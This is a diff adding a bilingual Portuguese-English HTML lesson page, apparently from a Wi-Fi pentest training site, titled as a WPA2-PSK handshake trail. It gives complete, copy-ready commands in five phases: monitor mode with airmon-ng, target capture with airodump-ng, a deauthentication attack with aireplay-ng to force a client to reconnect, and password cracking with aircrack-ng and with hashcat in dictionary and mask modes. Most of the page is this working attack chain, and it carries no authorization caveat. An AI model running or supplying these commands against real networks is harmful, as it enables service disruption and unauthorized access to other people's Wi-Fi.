@@ -1,0 +1,231 @@
+<!-- TRILHA WPA2-PSK — Sem terminal simulado, com i18n -->
+<div class="container-narrow" style="padding-top: var(--space-8); padding-bottom: var(--space-16);">
+
+    <!-- Header -->
+    <div class="flex items-center gap-3" style="margin-bottom: var(--space-3);">
+        <a href="#/home" class="btn btn-ghost btn-sm"><i class="fa-solid fa-arrow-left"></i> <span data-lang-pt>Voltar</span><span data-lang-en>Back</span></a>
+        <span class="badge badge-intermediate"><span data-lang-pt>⭐⭐ Intermediário</span><span data-lang-en>⭐⭐ Intermediate</span></span>
+    </div>
+    <div style="margin-bottom: var(--space-10);">
+        <h1 style="margin-bottom: var(--space-3);"><i class="fa-solid fa-satellite-dish" style="color: var(--accent-primary);"></i> <span data-lang-pt>Trilha WPA2-PSK Handshake</span><span data-lang-en>WPA2-PSK Handshake Trail</span></h1>
+        <p class="text-muted" style="font-size: var(--fs-md); max-width: 650px;">
+            <span data-lang-pt>Aprenda a capturar o handshake de 4 vias e quebre a senha com ataque offline.</span>
+            <span data-lang-en>Learn to capture the 4-way handshake and crack the password with an offline attack.</span>
+        </p>
+        <div style="margin-top: var(--space-4); max-width: 400px;">
+            <div class="flex justify-between items-center" style="margin-bottom: var(--space-2);">
+                <span class="text-sm text-muted"><span data-lang-pt>Progresso</span><span data-lang-en>Progress</span></span>
+                <span class="progress-label text-sm" style="color: var(--accent-primary);">0%</span>
+            </div>
+            <div class="progress-bar"><div class="progress-bar-fill" data-trail-progress="wpa2" style="width: 0%;"></div></div>
+        </div>
+    </div>
+
+    <!-- Shared Inputs -->
+    <div class="card-flat" style="margin-bottom: var(--space-8); padding: var(--space-6);">
+        <h3 style="margin-bottom: var(--space-4); font-size: var(--fs-base);">
+            <i class="fa-solid fa-sliders" style="color: var(--accent-primary);"></i>
+            <span data-lang-pt>Configuração do Ambiente</span><span data-lang-en>Environment Setup</span>
+        </h3>
+        <p class="text-muted text-sm" style="margin-bottom: var(--space-5);">
+            <span data-lang-pt>Preencha com os dados do seu lab. Os comandos serão atualizados automaticamente.</span>
+            <span data-lang-en>Fill in your lab data. Commands will update automatically.</span>
+        </p>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Interface de Rede</span><span data-lang-en>Network Interface</span></label>
+                <input type="text" id="iface" value="wlan0" data-cmd-input>
+            </div>
+            <div class="input-group">
+                <label>BSSID (<span data-lang-pt>MAC do Roteador</span><span data-lang-en>Router MAC</span>)</label>
+                <input type="text" id="bssid" value="00:11:22:33:44:55" data-cmd-input>
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Canal</span><span data-lang-en>Channel</span> (CH)</label>
+                <input type="number" id="channel" value="6" min="1" max="14" data-cmd-input>
+            </div>
+            <div class="input-group">
+                <label>STATION (<span data-lang-pt>MAC do Cliente</span><span data-lang-en>Client MAC</span>)</label>
+                <input type="text" id="client" value="AA:BB:CC:DD:EE:FF" data-cmd-input>
+            </div>
+        </div>
+        <div class="form-row">
+            <div class="input-group">
+                <label><span data-lang-pt>Caminho da Wordlist</span><span data-lang-en>Wordlist Path</span></label>
+                <input type="text" id="wordlist" value="/usr/share/wordlists/rockyou.txt" data-cmd-input>
+            </div>
+        </div>
+    </div>
+
+    <!-- FASE 1 -->
+    <div class="step-block reveal">
+        <div class="step-indicator">Fase 1</div>
+        <h2><i class="fa-solid fa-tower-broadcast"></i> <span data-lang-pt>Modo Monitor</span><span data-lang-en>Monitor Mode</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Placas de rede normais operam em <strong>Modo Gerenciado</strong>, ouvindo apenas pacotes destinados a elas. Para pentest, ativamos o <strong>Modo Monitor</strong> para escutar todo o tráfego de rádio. Antes, matamos processos que podem interferir.</span>
+            <span data-lang-en>Normal network cards operate in <strong>Managed Mode</strong>, only listening to packets addressed to them. For pentesting, we enable <strong>Monitor Mode</strong> to listen to all radio traffic. First, we kill interfering processes.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-terminal"></i> <span data-lang-pt>Comandos</span><span data-lang-en>Commands</span></div>
+            <span class="command-label"><span data-lang-pt>1. Matar processos conflitantes:</span><span data-lang-en>1. Kill interfering processes:</span></span>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code>sudo airmon-ng check kill</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <span class="command-label"><span data-lang-pt>2. Iniciar modo monitor:</span><span data-lang-en>2. Start monitor mode:</span></span>
+            <div class="command-box">
+                <code data-cmd="sudo airmon-ng start {iface}">sudo airmon-ng start wlan0</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-info">
+                <i class="fa-solid fa-circle-info"></i>
+                <span><span data-lang-pt>Após o comando, sua interface mudará de nome (ex: <code>wlan0</code> → <code>wlan0mon</code>). Verifique com <code>iwconfig</code>.</span><span data-lang-en>After the command, your interface will rename (e.g.: <code>wlan0</code> → <code>wlan0mon</code>). Verify with <code>iwconfig</code>.</span></span>
+            </div>
+        </div>
+        <label class="step-check">
+            <input type="checkbox" data-step="1">
+            <span class="checkmark"><i class="fa-solid fa-check"></i></span>
+            <span><span data-lang-pt>Modo monitor ativado</span><span data-lang-en>Monitor mode enabled</span></span>
+        </label>
+    </div>
+
+    <!-- FASE 2 -->
+    <div class="step-block reveal">
+        <div class="step-indicator">Fase 2</div>
+        <h2><i class="fa-solid fa-magnifying-glass"></i> <span data-lang-pt>Reconhecimento</span><span data-lang-en>Reconnaissance</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Use <code>airodump-ng</code> para escanear todas as redes. Quando encontrar o alvo, pare (<kbd>Ctrl+C</kbd>) e inicie um escaneamento focado, salvando a captura em arquivo.</span>
+            <span data-lang-en>Use <code>airodump-ng</code> to scan all networks. When you find the target, stop (<kbd>Ctrl+C</kbd>) and start a focused scan, saving the capture to a file.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-radar"></i> <span data-lang-pt>Escaneamento Geral</span><span data-lang-en>General Scan</span></div>
+            <div class="command-box" style="margin-bottom: var(--space-6);">
+                <code data-cmd="sudo airodump-ng {ifaceMon}">sudo airodump-ng wlan0mon</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="action-title"><i class="fa-solid fa-crosshairs"></i> <span data-lang-pt>Captura Focada no Alvo</span><span data-lang-en>Target-Focused Capture</span></div>
+            <div class="command-box">
+                <code data-cmd="sudo airodump-ng -c {channel} --bssid {bssid} -w {fileBase} {ifaceMon}">sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura_lab wlan0mon</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-success">
+                <i class="fa-solid fa-triangle-exclamation"></i>
+                <span><span data-lang-pt><strong>Importante:</strong> Deixe este comando rodando e abra um <strong>novo terminal</strong> para a Fase 3!</span><span data-lang-en><strong>Important:</strong> Keep this command running and open a <strong>new terminal</strong> for Phase 3!</span></span>
+            </div>
+        </div>
+        <label class="step-check">
+            <input type="checkbox" data-step="2">
+            <span class="checkmark"><i class="fa-solid fa-check"></i></span>
+            <span><span data-lang-pt>Rede alvo localizada e captura em andamento</span><span data-lang-en>Target network found and capture running</span></span>
+        </label>
+    </div>
+
+    <!-- FASE 3 -->
+    <div class="step-block reveal">
+        <div class="step-indicator">Fase 3</div>
+        <h2><i class="fa-solid fa-burst"></i> <span data-lang-pt>Ataque Deauth (Forçar Handshake)</span><span data-lang-en>Deauth Attack (Force Handshake)</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Precisamos capturar o <strong>Handshake de 4 vias</strong> — quando um dispositivo se autentica. Usamos <code>aireplay-ng</code> para forçar a desconexão de um cliente. Ao reconectar, o handshake é capturado no terminal da Fase 2.</span>
+            <span data-lang-en>We need to capture the <strong>4-way Handshake</strong> — when a device authenticates. We use <code>aireplay-ng</code> to force a client disconnect. On reconnect, the handshake is captured in the Phase 2 terminal.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-bolt"></i> <span data-lang-pt>Pacotes Deauth</span><span data-lang-en>Deauth Packets</span></div>
+            <div class="command-box">
+                <code data-cmd="sudo aireplay-ng -0 10 -a {bssid} -c {client} {ifaceMon}">sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-warning">
+                <i class="fa-solid fa-eye"></i>
+                <span><span data-lang-pt>Volte ao terminal da Fase 2. Se deu certo, você verá <strong style="color: var(--accent-primary);">"WPA handshake: [MAC]"</strong> no canto superior direito.</span><span data-lang-en>Go back to Phase 2 terminal. If successful, you'll see <strong style="color: var(--accent-primary);">"WPA handshake: [MAC]"</strong> in the top right corner.</span></span>
+            </div>
+        </div>
+        <label class="step-check">
+            <input type="checkbox" data-step="3">
+            <span class="checkmark"><i class="fa-solid fa-check"></i></span>
+            <span><span data-lang-pt>Handshake capturado com sucesso</span><span data-lang-en>Handshake captured successfully</span></span>
+        </label>
+    </div>
+
+    <!-- FASE 4 -->
+    <div class="step-block reveal">
+        <div class="step-indicator">Fase 4</div>
+        <h2><i class="fa-solid fa-unlock-keyhole"></i> <span data-lang-pt>Crack com Aircrack-ng (CPU)</span><span data-lang-en>Crack with Aircrack-ng (CPU)</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt>Agora o ataque é <strong>100% offline</strong>. O <code>aircrack-ng</code> testa cada senha da wordlist contra o handshake. Simples mas mais lento que GPU.</span>
+            <span data-lang-en>Now the attack is <strong>100% offline</strong>. <code>aircrack-ng</code> tests each password from the wordlist against the handshake. Simple but slower than GPU.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-key"></i> <span data-lang-pt>Quebrando a Senha</span><span data-lang-en>Cracking the Password</span></div>
+            <div class="command-box">
+                <code data-cmd="aircrack-ng -w {wordlist} -b {bssid} {fileBase}-01.cap">aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 captura_lab-01.cap</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-info">
+                <i class="fa-solid fa-gauge-high"></i>
+                <span><span data-lang-pt><strong>Performance:</strong> CPU processa ~2.000-5.000 chaves/s. Para senhas complexas, use a Fase 5 (Hashcat com GPU).</span><span data-lang-en><strong>Performance:</strong> CPU processes ~2,000-5,000 keys/s. For complex passwords, use Phase 5 (Hashcat with GPU).</span></span>
+            </div>
+        </div>
+        <label class="step-check">
+            <input type="checkbox" data-step="4">
+            <span class="checkmark"><i class="fa-solid fa-check"></i></span>
+            <span><span data-lang-pt>Senha encontrada — "KEY FOUND!"</span><span data-lang-en>Password found — "KEY FOUND!"</span></span>
+        </label>
+    </div>
+
+    <!-- FASE 5 (Bônus) -->
+    <div class="step-block reveal">
+        <div class="step-indicator" style="background: linear-gradient(135deg, #a78bfa, #f472b6);">Fase 5 — Bônus</div>
+        <h2><i class="fa-solid fa-microchip"></i> <span data-lang-pt>Crack com Hashcat (GPU)</span><span data-lang-en>Crack with Hashcat (GPU)</span></h2>
+        <p class="lesson-text">
+            <span data-lang-pt><code>Hashcat</code> usa a GPU e pode ser <strong>100x-1000x mais rápido</strong>. Primeiro converta o <code>.cap</code> para <code>.hc22000</code>.</span>
+            <span data-lang-en><code>Hashcat</code> uses the GPU and can be <strong>100x-1000x faster</strong>. First convert the <code>.cap</code> to <code>.hc22000</code>.</span>
+        </p>
+        <div class="action-area">
+            <div class="action-title"><i class="fa-solid fa-arrows-rotate"></i> <span data-lang-pt>Converter arquivo</span><span data-lang-en>Convert file</span></div>
+            <div class="command-box" style="margin-bottom: var(--space-6);">
+                <code data-cmd="hcxpcapngtool -o hash.hc22000 {fileBase}-01.cap">hcxpcapngtool -o hash.hc22000 captura_lab-01.cap</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="action-title"><i class="fa-solid fa-fire"></i> <span data-lang-pt>Crack com GPU (dicionário)</span><span data-lang-en>GPU Crack (dictionary)</span></div>
+            <div class="command-box" style="margin-bottom: var(--space-4);">
+                <code data-cmd="hashcat -m 22000 hash.hc22000 {wordlist} --force">hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt --force</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="action-title"><i class="fa-solid fa-masks-theater"></i> <span data-lang-pt>Modo Máscara (brute force)</span><span data-lang-en>Mask Mode (brute force)</span></div>
+            <p class="text-sm text-muted" style="margin-bottom: var(--space-3);">
+                <span data-lang-pt>Exemplo: senhas de 8 dígitos numéricos:</span>
+                <span data-lang-en>Example: 8-digit numeric passwords:</span>
+            </p>
+            <div class="command-box">
+                <code>hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d</code>
+                <button class="btn btn-ghost btn-sm btn-copy"><i class="fa-regular fa-copy"></i> <span data-lang-pt>Copiar</span><span data-lang-en>Copy</span></button>
+            </div>
+            <div class="info-box info-info" style="margin-top: var(--space-4);">
+                <i class="fa-solid fa-lightbulb"></i>
+                <span><span data-lang-pt><strong>Máscaras:</strong> <code>?d</code>=dígito, <code>?l</code>=minúscula, <code>?u</code>=maiúscula, <code>?s</code>=especial, <code>?a</code>=tudo.</span><span data-lang-en><strong>Masks:</strong> <code>?d</code>=digit, <code>?l</code>=lowercase, <code>?u</code>=uppercase, <code>?s</code>=special, <code>?a</code>=all.</span></span>
+            </div>
+        </div>
+        <label class="step-check">
+            <input type="checkbox" data-step="5">
+            <span class="checkmark"><i class="fa-solid fa-check"></i></span>
+            <span><span data-lang-pt>Senha encontrada com Hashcat</span><span data-lang-en>Password found with Hashcat</span></span>
+        </label>
+    </div>
+
+    <!-- Trail Completion -->
+    <div class="card-flat reveal" style="text-align: center; padding: var(--space-10);">
+        <i class="fa-solid fa-trophy" style="font-size: 3rem; color: var(--accent-primary); margin-bottom: var(--space-4); display: block;"></i>
+        <h2><span data-lang-pt>Trilha Completa!</span><span data-lang-en>Trail Complete!</span></h2>
+        <p class="text-muted" style="margin-top: var(--space-2); margin-bottom: var(--space-6);">
+            <span data-lang-pt>Parabéns! Explore as outras trilhas para ampliar seu arsenal.</span>
+            <span data-lang-en>Congratulations! Explore other trails to expand your skills.</span>
+        </p>
+        <div class="flex justify-center gap-4 flex-wrap">
+            <a href="#/wps" class="btn btn-primary"><i class="fa-solid fa-arrow-right"></i> <span data-lang-pt>Trilha WPS</span><span data-lang-en>WPS Trail</span></a>
+            <a href="#/pmkid" class="btn btn-outline"><i class="fa-solid fa-bolt"></i> <span data-lang-pt>Trilha PMKID</span><span data-lang-en>PMKID Trail</span></a>
+            <a href="#/home" class="btn btn-ghost"><i class="fa-solid fa-house"></i> <span data-lang-pt>Início</span><span data-lang-en>Home</span></a>
+        </div>
+    </div>
+</div>
